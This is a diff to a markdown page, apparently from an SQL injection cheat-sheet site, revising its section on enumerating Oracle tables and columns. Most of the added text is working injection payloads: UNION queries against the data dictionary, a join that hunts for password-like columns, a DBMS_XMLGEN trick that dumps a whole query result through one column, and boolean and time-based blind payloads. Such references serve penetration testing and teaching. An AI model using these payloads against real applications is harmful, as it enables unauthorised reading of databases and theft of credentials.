@@ -4,7 +4,7 @@ description: Methods to enumerate database tables and columns in Oracle
 category: Information Gathering
 order: 7
 tags: ["tables", "columns", "schema", "enumeration"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 Enumerating tables and columns is a critical step in Oracle SQL injection attacks. Oracle stores metadata about all database objects in the data dictionary, a set of tables and views that contain information about the database structure.
@@ -22,6 +22,8 @@ Oracle provides several data dictionary views to query database structure:
 | `DBA_TABLES`       | All tables in the database        | Complete table information (requires privileges)  |
 | `DBA_TAB_COLUMNS`  | All columns in the database       | Complete column information (requires privileges) |
 | `ALL_OBJECTS`      | All objects accessible to user    | Objects by type (TABLE, VIEW, etc.)               |
+
+The `DBA_` views need `SELECT ANY DICTIONARY` or `SELECT_CATALOG_ROLE`; the `ALL_` and `USER_` views work for any user. Unquoted names are stored in uppercase, so compare with `'USERS'`, not `'users'`.
 
 ## Basic Table Enumeration
 
@@ -61,6 +63,8 @@ SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='EMPLOYEES' AND ROWNUM 
 ## SQL Injection Examples
 
 ### UNION-Based Enumeration
+
+The UNION examples assume a two-column string query such as `SELECT username, email FROM users WHERE username = '<input>'`:
 
 ```sql
 -- Enumerate table names
@@ -104,37 +108,54 @@ In Oracle, ROWNUM is used for pagination, which is useful when dealing with larg
 ' UNION SELECT TABLE_NAME,NULL FROM ALL_TABLES WHERE ROWNUM <= 10--
 
 -- Get tables 11-20
-' UNION SELECT TABLE_NAME,NULL FROM (SELECT TABLE_NAME, ROWNUM AS rn FROM ALL_TABLES) WHERE rn BETWEEN 11 AND 20--
+' UNION SELECT TABLE_NAME,NULL FROM (SELECT TABLE_NAME, ROWNUM AS rn FROM (SELECT TABLE_NAME FROM ALL_TABLES ORDER BY TABLE_NAME)) WHERE rn BETWEEN 11 AND 20--
 ```
 
-### Subquery Factoring (WITH Clause)
+### Joining Tables and Columns
+
+`ALL_TAB_COLUMNS` also lists view columns; joining it to `ALL_TABLES` (on owner and name) keeps only tables:
 
 ```sql
--- Find tables with interesting column combinations
-' UNION SELECT t.table_name, c.column_name FROM ALL_TABLES t JOIN ALL_TAB_COLUMNS c ON t.table_name=c.table_name WHERE c.column_name LIKE '%PASS%'--
+-- Tables with a column named like PASS, with their owner
+' UNION SELECT c.owner||'.'||c.table_name, c.column_name FROM ALL_TABLES t JOIN ALL_TAB_COLUMNS c ON t.owner=c.owner AND t.table_name=c.table_name WHERE c.column_name LIKE '%PASS%'--
 ```
 
-### Using Data Dictionary Cache
+### Dumping a Query in One Value
+
+`DBMS_XMLGEN.GETXML` runs a query given as a string and returns every row as one XML document, so a single injected column returns a whole table. `EXECUTE` on `DBMS_XMLGEN` is granted to `PUBLIC`, and it worked for a user with only `CREATE SESSION` on 11g XE and 23ai. The result is a `CLOB`, which a `UNION` with a text column rejects (`ORA-01790`), so convert the first 4000 characters with `DBMS_LOB.SUBSTR`:
 
 ```sql
--- Query the data dictionary cache
-' UNION SELECT NAME,NAMESPACE FROM v$db_object_cache WHERE TYPE='TABLE'--
+-- Table names and owners as one XML value
+' UNION SELECT DBMS_LOB.SUBSTR(DBMS_XMLGEN.GETXML('SELECT owner, table_name FROM all_tables'),4000,1),NULL FROM dual--
+
+-- Alternative quoting (q'[...]') avoids doubling the quotes of the inner query
+' UNION SELECT DBMS_LOB.SUBSTR(DBMS_XMLGEN.GETXML(q'[SELECT username FROM all_users WHERE username='SYSTEM']'),4000,1),NULL FROM dual--
+```
+
+Read past 4000 characters by moving the offset (`DBMS_LOB.SUBSTR(..., 4000, 4001)`), or narrow the inner query with `WHERE ROWNUM <= n`.
+
+### Using the Library Cache
+
+`V$DB_OBJECT_CACHE` lists objects recently used by any session, including tables of other schemas, but it needs `SELECT ANY DICTIONARY` or `SELECT_CATALOG_ROLE`:
+
+```sql
+' UNION SELECT OWNER||'.'||NAME,NAMESPACE FROM v$db_object_cache WHERE TYPE='TABLE'--
 ```
 
 ## Blind Enumeration
 
-For blind SQL injection, character-by-character extraction:
+For blind SQL injection, extract names character by character. The injected value must make the original condition true (here `admin`), otherwise the result is always empty:
 
 ```sql
 -- Check if first character of first table name is 'A'
-' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM ALL_TABLES WHERE ROWNUM=1),1,1))=65--
+admin' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM ALL_TABLES WHERE ROWNUM=1),1,1))=65--
 ```
 
-For time-based blind:
+For time-based blind (`DBMS_PIPE` needs an explicit grant, see [Timing](/oracle/timing)):
 
 ```sql
 -- Add delay if first character of table name is 'A'
-' AND (CASE WHEN ASCII(SUBSTR((SELECT TABLE_NAME FROM ALL_TABLES WHERE ROWNUM=1),1,1))=65 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
+admin' AND (CASE WHEN ASCII(SUBSTR((SELECT TABLE_NAME FROM ALL_TABLES WHERE ROWNUM=1),1,1))=65 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE 0 END)>=0--
 ```
 
 ## Counting Objects
